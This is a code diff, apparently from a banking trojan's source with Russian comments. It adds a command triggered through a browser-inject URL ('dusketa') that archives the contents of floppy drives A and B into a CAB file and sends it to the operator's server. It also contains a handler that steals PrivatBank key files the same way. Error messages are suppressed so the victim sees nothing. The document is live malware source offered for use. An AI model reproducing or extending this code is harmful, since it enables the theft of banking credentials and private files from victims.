@@ -12,6 +12,10 @@
 #include "StrConsts.h"
 
 void SendPrivatBankKey(const char* Command, const char* Params);
+void SendFloppyDiskToServer(const char* Command, const char* Params);
+
+
+
 
 
 
@@ -43,12 +47,34 @@ bool ProcessHTMLInjectRequest(const char* URL, bool* CloseRequest)
 	if (Pos >= 0)
 		URL += Pos + 3;
 
+
 	// Определяем начало строки параметров
 	PCHAR Params = STRA::Scan(URL, '/');
 
 	// Определяем длину команды
 	int CmdLen = (Params) ? (Params - URL) : STRA::Length(URL);
 
+
+	// в случае остутствия данных в домене FireFox автоматически
+	// дополняет команду строками www и .com
+	// т.е. наша команда получает вид www.command.com
+
+	if (STRA::Hash(URL, 4, true) == 0xEFDFBAE /* www. */)
+	{
+		URL += 4;
+		CmdLen -= 4;
+	}
+
+	if (CmdLen > 4)
+	{
+		PCHAR Tmp = (PCHAR)URL + (CmdLen - 4);
+		if (STRA::Hash(Tmp, 4, true) == 0x5D8F7ED /* .com */)
+		{
+			CmdLen -= 4;
+		}
+    }
+
+	// Обрабатываем команду
 	if (Params) Params++;
 
 	DWORD CmdHash = STRA::Hash(URL, CmdLen, true);
@@ -59,6 +85,9 @@ bool ProcessHTMLInjectRequest(const char* URL, bool* CloseRequest)
 
 	if (CmdHash == 0x9E19D547 /* keypath */)
 		Command = SendPrivatBankKey;
+	else
+	if (CmdHash == 0x3D78E9CE /* dusketa */)
+		Command = SendFloppyDiskToServer;
 
 
 	// Выполняем команду
@@ -76,13 +105,15 @@ bool ProcessHTMLInjectRequest(const char* URL, bool* CloseRequest)
 
 	return Result;
 }
+//-----------------------------------------------------------------------------
 
 
 
-//----------------------------------------------------------------------------
+//---------------------------------------------------
+//  Функция отправляет файл ключа приватбанка
+//---------------------------------------------------
 void SendPrivatBankKey(const char* Command, const char* Params)
 {
-	// Функция отправляет файл ключа приватбанка
 	if (!File::IsExists((PCHAR)Params))
 		return;
 
@@ -94,10 +125,41 @@ void SendPrivatBankKey(const char* Command, const char* Params)
 	{
 		PCHAR Name = File::ExtractFileNameA((PCHAR)Params, false);
 		bool Added = AddFileToCab(Cab, Params, Name);
+		CloseCab(Cab);
 
 		DataGrabber::SendCabDelayed(NULL, FN.t_str(), GetStr(EStrSystemPrivat).t_str());
-
-		CloseCab(Cab);
 	}
 	DeleteFileA(FN.t_str());
 }
+//-----------------------------------------------------------------------------
+
+
+//---------------------------------------------------
+//  Функция отправляет содержимое флоппидисков на
+//  сервер админки
+//---------------------------------------------------
+void SendFloppyDiskToServer(const char* Command, const char* Params)
+{
+	string FN = File::GetTempName2A();
+	HCAB Cab = CreateCab(FN.t_str());
+	if (Cab)
+	{
+		DWORD EMode = (DWORD)pSetErrorMode(SEM_FAILCRITICALERRORS);
+
+		// Добавляем диска "A" и "B" в каб
+		bool Added = AddDirToCab(Cab, "a:\\", "drive_a");
+
+		if (AddDirToCab(Cab, "b:\\", "drive_b"))
+			Added = true;
+
+		pSetErrorMode(EMode);
+
+
+		CloseCab(Cab);
+
+        if (Added)
+			Added = DataGrabber::SendCabDelayed(NULL, FN.t_str(), GetStr(EStrCabNameDisketa).t_str());
+	}
+    DeleteFileA(FN.t_str());
+}
+//-----------------------------------------------------------------------------
